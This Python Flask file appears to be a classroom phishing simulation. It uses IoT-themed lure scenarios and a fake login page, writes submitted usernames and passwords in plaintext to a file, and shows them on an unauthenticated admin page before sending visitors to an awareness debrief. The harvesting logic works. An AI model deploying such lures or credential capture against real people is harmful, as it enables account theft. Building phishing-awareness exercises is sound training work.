"""
IoT Phishing Attack Simulation and Prevention (SET-Inspired)
=============================================================
A Flask web application that simulates the phishing attack lifecycle
in a controlled educational environment for cybersecurity awareness.

Routes:
    /panel      - SET-like control panel to pick a phishing scenario
    /           - Lure / entry page (dynamic content based on scenario)
    /login      - Fake IoT-themed login page
    /capture    - Credential harvesting (POST) → saves to text file
    /awareness  - Educational debrief after credential submission
    /admin      - Admin dashboard showing captured credentials
    /qrcode     - QR code image for the lure page URL
"""

import os
import io
from datetime import datetime

from flask import (
    Flask,
    render_template,
    request,
    redirect,
    url_for,
    send_file,
)

# Optional: QR code generation
try:
    import qrcode
    QR_AVAILABLE = True
except ImportError:
    QR_AVAILABLE = False

# ---------------------------------------------------------------------------
# App configuration
# ---------------------------------------------------------------------------
app = Flask(__name__)

# Path to the flat-file credential store
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
CREDENTIALS_FILE = os.path.join(DATA_DIR, "credentials.txt")

# Ensure the data directory and file exist
os.makedirs(DATA_DIR, exist_ok=True)
if not os.path.exists(CREDENTIALS_FILE):
    open(CREDENTIALS_FILE, "w").close()

# ---------------------------------------------------------------------------
# Scenario definitions
# ---------------------------------------------------------------------------
SCENARIOS = {
    "storage": {
        "title": "Free Cloud Storage Offer",
        "icon": "☁️",
        "hook": "Claim Your FREE 50 GB Cloud Storage!",
        "description": (
            "Your IoT hub account has been selected for a complimentary "
            "50 GB cloud-storage upgrade. Verify your device credentials "
            "to activate the offer before it expires."
        ),
        "login_context": "Verify your Smart-Hub account to activate free storage.",
        "tactic": "Reward / Greed",
        "color": "#0ea5e9",
    },
    "warranty": {
        "title": "Warranty Expiry Notice",
        "icon": "⚠️",
        "hook": "Your Device Warranty Expires Today!",
        "description": (
            "Our records indicate that the warranty for your connected "
            "security camera is about to expire. Log in now to extend "
            "coverage at no additional cost."
        ),
        "login_context": "Log in to your device portal to extend your warranty.",
        "tactic": "Fear / Loss Aversion",
        "color": "#f59e0b",
    },
    "security": {
        "title": "Critical Security Alert",
        "icon": "🔒",
        "hook": "Unauthorized Access Detected on Your Router!",
        "description": (
            "We detected suspicious login attempts on your home router. "
            "Immediately verify your credentials to secure your network "
            "and prevent data theft."
        ),
        "login_context": "Confirm your identity to secure your router.",
        "tactic": "Urgency / Fear",
        "color": "#ef4444",
    },
}

DEFAULT_SCENARIO = "storage"


def _get_scenario(request_obj):
    """Return the scenario dict for the current request's ?type= param."""
    key = request_obj.args.get("type", DEFAULT_SCENARIO)
    return key, SCENARIOS.get(key, SCENARIOS[DEFAULT_SCENARIO])


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route("/panel")
def panel():
    """SET-like control panel — choose a phishing scenario."""
    return render_template("panel.html", scenarios=SCENARIOS)


@app.route("/")
def index():
    """Lure / entry page — displays the phishing hook message."""
    scenario_key, scenario = _get_scenario(request)
    return render_template("index.html", scenario=scenario, scenario_key=scenario_key)


@app.route("/login")
def login():
    """Fake IoT-themed login page."""
    scenario_key, scenario = _get_scenario(request)
    return render_template("login.html", scenario=scenario, scenario_key=scenario_key)


@app.route("/capture", methods=["POST"])
def capture():
    """
    Credential harvesting endpoint.
    Saves username, password, and timestamp to data/credentials.txt,
    then redirects the victim to the awareness / debrief page.
    """
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    scenario_key = request.form.get("type", DEFAULT_SCENARIO)

    # Append to flat file (pipe-delimited for easy parsing)
    with open(CREDENTIALS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{username}|{password}|{timestamp}|{scenario_key}\n")

    return redirect(url_for("awareness", type=scenario_key))


@app.route("/awareness")
def awareness():
    """Educational awareness page — explains why the attack worked."""
    scenario_key, scenario = _get_scenario(request)
    return render_template("awareness.html", scenario=scenario, scenario_key=scenario_key)


@app.route("/admin")
def admin():
    """Admin dashboard — displays all captured credentials in a table."""
    entries = []
    if os.path.exists(CREDENTIALS_FILE):
        with open(CREDENTIALS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split("|")
                if len(parts) >= 3:
                    entries.append({
                        "username": parts[0],
                        "password": parts[1],
                        "timestamp": parts[2],
                        "scenario": parts[3] if len(parts) > 3 else "unknown",
                    })
    return render_template("admin.html", entries=entries)


@app.route("/qrcode")
def generate_qr():
    """Generate a QR code that points to the lure page."""
    if not QR_AVAILABLE:
        return "QR code library not installed. Run: pip install qrcode[pil]", 500

    scenario_key = request.args.get("type", DEFAULT_SCENARIO)
    # Build the target URL (uses request host so it works on any machine)
    target_url = request.url_root.rstrip("/") + f"/?type={scenario_key}"

    img = qrcode.make(target_url)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    return send_file(buf, mimetype="image/png")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print("\n  IoT Phishing Simulation Server")
    print("  ================================")
    print("  Control Panel : http://127.0.0.1:5000/panel")
    print("  Admin Page    : http://127.0.0.1:5000/admin")
    print("  Lure Page     : http://127.0.0.1:5000/?type=storage")
    print()
    app.run(debug=True, host="127.0.0.1", port=5000)
